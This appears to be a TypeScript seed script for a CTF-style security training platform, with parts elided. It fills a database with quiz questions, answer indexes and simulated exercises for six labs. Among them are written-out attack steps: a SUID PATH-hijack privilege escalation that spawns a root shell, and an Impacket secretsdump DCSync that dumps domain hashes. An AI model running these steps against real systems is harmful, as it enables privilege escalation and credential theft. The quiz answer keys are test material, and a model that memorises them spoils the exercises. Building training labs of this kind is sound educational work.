import { db, pool, modulesTable } from "@workspace/db";

const modules = [
  // ─── Lab 1: Web Application Pentesting ───────────────────────────────────
  {
    labId: 1,
    ...
    content: {
      questions: [
        ...
        },
        {
          ...
          options: ["SQL Injection", "XXE Injection", "Reflected XSS", "SSRF"],
          correctIndex: 2,
...
?>`,
  ...
  // ─── Lab 2: Network Forensics & Analysis ──────────────────────────────────
  {
    labId: 2,
    ...
    content: {
      questions: [
        ...
        },
        {
          ...
          options: ["TCP Connect Scan", "SYN (Stealth) Scan", "XMAS Scan", "FIN Scan"],
          correctIndex: 1,
        ...
        },
        {
          ...
          options: ["tcp.port==80", 'http.request.method=="GET"', "http && tcp.flags.syn==1", "ip.proto==6 && http"],
          correctIndex: 1,
  ...
  },
  {
    ...
    content: {
      ...
      simulatedInterface: {
        type: "pcap-viewer",
        packets: [
          { no: 1, time: "0.000000", src: "192.168.1.10", dst: "192.168.1.20", proto: "TCP",  info: "SYN -> port 21" },
          { no: 2, time: "0.001231", src: "192.168.1.20", dst: "192.168.1.10", proto: "FTP",  info: "220 FTP Server Ready" },
          { no: 3, time: "0.002100", src: "192.168.1.10", dst: "192.168.1.20", proto: "FTP",  info: "USER analyst" },
          { no: 4, time: "0.003200", src: "192.168.1.20", dst: "192.168.1.10", proto: "FTP",  info: "331 Password required" },
          { no: 5, time: "0.004100", src: "192.168.1.10", dst: "192.168.1.20", proto: "FTP",  info: "PASS FLAG{ftp_cleartext_intercepted}" },
          { no: 6, time: "0.005300", src: "192.168.1.20", dst: "192.168.1.10", proto: "FTP",  info: "230 Login successful" },
        ],
      },
      hints: [
...
beacon()`,
  ...
  // ─── Lab 3: Malware Analysis & Reverse Engineering ────────────────────────
  {
    labId: 3,
      ...
      questions: [
        {
          ...
          options: ["Payload", "Dropper", "Rootkit", "Keylogger"],
          correctIndex: 1,
        ...
        },
        {
          ...
          options: ["Polymorphism", "Rootkit", "Packing", "Sandbox evasion"],
          correctIndex: 1,
        ...
        },
        {
          ...
          options: ["Obfuscation", "Metamorphism", "Polymorphism", "Packing"],
          correctIndex: 2,
  ...
  },
  {
    ...
    content: {
      ...
      simulatedInterface: {
        type: "exploit-steps",
        steps: [
          { cmd: "echo '/bin/bash -p' > /tmp/tar", desc: "Create a fake tar that spawns a privileged shell" },
          { cmd: "chmod +x /tmp/tar", desc: "Make it executable" },
          { cmd: "export PATH=/tmp:$PATH", desc: "Prepend /tmp to PATH so your tar runs first" },
          { cmd: "/opt/backup_tool", desc: "Run the SUID binary — it calls YOUR tar — root shell!" },
          { cmd: "cat /root/flag.txt", desc: "Read the flag as root" },
        ],
...
echo "Backup completed: $(date)" >> /var/log/backup.log`,
  ...
  // ─── Lab 5: Active Directory Attacks ──────────────────────────────────────
  {
    labId: 5,
    ...
    content: {
      questions: [
        ...
        },
        {
          ...
          options: ["Silver Ticket", "Golden Ticket", "Pass-the-Hash", "Overpass-the-Hash"],
          correctIndex: 1,
  ...
  },
  {
    ...
    content: {
      ...
      simulatedInterface: {
        type: "exploit-steps",
        steps: [
          { cmd: "secretsdump.py CORP.LOCAL/svc_backup:Backup@2024!@10.10.10.10", desc: "Run Impacket secretsdump against the DC" },
          { cmd: "[DC] Dumping Domain Credentials (DRSUAPI method)...", desc: "DCSync request sent, DC responds with hashes" },
          { cmd: "Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931...", desc: "Domain Admin NTLM hash extracted" },
          { cmd: "krbtgt:502:aad3b435b51404ee:FLAG{dcsync_krbtgt_golden_ticket_ready}", desc: "KRBTGT hash extracted — flag embedded in hash" },
        ],
      ...
      questions: [
        {
          ...
          options: ["Cryptography", "Binary Exploitation (Pwn)", "Web", "Forensics"],
          correctIndex: 1,
        ...
        },
        {
          ...
          options: ["Pwn", "Reverse Engineering", "Network Forensics", "Steganography"],
          correctIndex: 2,
        ...
        },
        {
          ...
          options: ["Burp Suite", "Wireshark", "Ghidra / IDA Pro", "Metasploit"],
          correctIndex: 2,
        ...
        },
        {
          ...
          options: ["Hex encoding", "ROT13", "Base64", "URL encoding"],
          correctIndex: 2,
  ...
  },
  {
    ...
    content: {
      ...
      simulatedInterface: {
        type: "decoder",
        layers: [
          { encoding: "Hex", value: "524f5433207468697320666972737421", decoded: "ROT13 this first!" },
          { encoding: "ROT13", value: "ROT13 this first!", decoded: "EBG13 guvf svefg!" },
          { encoding: "Note", value: "Ignore the ROT13 loop — the real flag is in Base64 below.", decoded: "" },
          { encoding: "Base64", value: "RkxBR3tjdGZfbXVsdGlfZW5jb2RlZF9mbGFnfQ==", decoded: "FLAG{ctf_multi_encoded_flag}" },
        ],
...
async function main() {
  console.log("Seeding interactive modules...");
  await db.delete(modulesTable);

  for (const mod of modules) {
    await db.insert(modulesTable).values(mod as any);
  }

  console.log(`Seeded ${modules.length} modules across 6 labs`);
  await pool.end();
}
